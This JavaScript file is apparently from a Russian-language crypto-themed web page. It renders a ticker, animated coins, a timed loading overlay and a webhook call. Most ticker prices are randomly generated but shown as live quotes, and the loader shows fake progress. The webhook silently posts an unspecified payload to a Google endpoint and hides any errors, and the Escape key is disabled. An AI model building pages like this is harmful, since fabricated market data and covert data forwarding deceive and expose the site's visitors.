function buildTopTicker() {
    const track = document.getElementById('topTickerTrack');
    if (!track) return;
    const pairs = [
        { sym: 'BTC/USD', price: () => window.btcPrice, change: 2.34 },
        { sym: 'ETH/USD', price: () => 3200 + Math.random() * 100, change: 1.87 },
        { sym: 'SOL/USD', price: () => 145 + Math.random() * 5, change: 4.12 },
        { sym: 'BNB/USD', price: () => 590 + Math.random() * 20, change: -0.56 },
        { sym: 'USD/RUB', price: () => window.usdToRub, change: -0.12 },
        { sym: 'XRP/USD', price: () => 0.62 + Math.random() * 0.03, change: 1.23 },
        { sym: 'ADA/USD', price: () => 0.45 + Math.random() * 0.02, change: -1.08 },
        { sym: 'DOGE/USD', price: () => 0.16 + Math.random() * 0.01, change: 3.45 },
        { sym: 'TON/USD', price: () => 5.4 + Math.random() * 0.3, change: 2.01 }
    ];
    let html = '';
    for (let r = 0; r < 2; r++) {
        pairs.forEach(p => {
            const pr = p.price();
            const cls = p.change >= 0 ? 'up' : 'down';
            const sg = p.change >= 0 ? '+' : '';
            html += `
                <div class="ticker-item">
                    <span class="sym">${p.sym}</span>
                    <span class="val">${p.sym === 'USD/RUB' ? pr.toFixed(3) + ' ₽' : '$' + pr.toLocaleString('en-US', { maximumFractionDigits: 2 })}</span>
                    <span class="chg ${cls}">${sg}${p.change.toFixed(2)}%</span>
                </div>
            `;
        });
    }
    track.innerHTML = html;
}

function spawnCoins() {
    const c = document.getElementById('floatingCoins');
    if (!c) return;
    const sym = ['₿', '₿', '₿', '💰', '⛏️'];
    for (let i = 0; i < 12; i++) {
        const coin = document.createElement('div');
        coin.className = 'coin';
        coin.textContent = sym[Math.floor(Math.random() * sym.length)];
        coin.style.left = Math.random() * 100 + '%';
        coin.style.bottom = '-40px';
        coin.style.fontSize = (14 + Math.random() * 18) + 'px';
        coin.style.animationDuration = (14 + Math.random() * 16) + 's';
        coin.style.animationDelay = (Math.random() * 14) + 's';
        coin.style.color = Math.random() > 0.5 ? '#f7931a' : '#22d3ee';
        coin.style.opacity = 0.15 + Math.random() * 0.2;
        coin.style.textShadow = '0 0 12px currentColor';
        c.appendChild(coin);
    }
}

function showPageLoader(text, seconds, subPrefix) {
    return new Promise(resolve => {
        const loader = document.getElementById('pageLoader');
        const lt = document.getElementById('loaderText');
        const lb = document.getElementById('loaderBarFill');
        const ltm = document.getElementById('loaderTimer');
        if (!loader) { resolve(); return; }
        lt.textContent = text;
        lb.style.width = '0%';
        ltm.innerHTML = (subPrefix || 'До завершения осталось примерно: ') + '<strong>' + seconds + ' сек</strong>';
        loader.classList.add('active');

        const start = Date.now();
        const total = seconds * 1000;
        const iv = setInterval(() => {
            const el = Date.now() - start;
            const p = Math.min(el / total, 1);
            lb.style.width = (p * 100).toFixed(1) + '%';
            const left = Math.max(0, Math.ceil(seconds - el / 1000));
            ltm.innerHTML = (subPrefix || 'До завершения осталось примерно: ') + '<strong>' + left + ' сек</strong>';
            if (p >= 1) {
                clearInterval(iv);
                loader.classList.remove('active');
                resolve();
            }
        }, 100);
    });
}

function sendWebhook(payload) {
    try {
        fetch(GOOGLE_WEBHOOK, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(() => {});
    } catch (e) {}
}

document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') { e.preventDefault(); e.stopPropagation(); }
});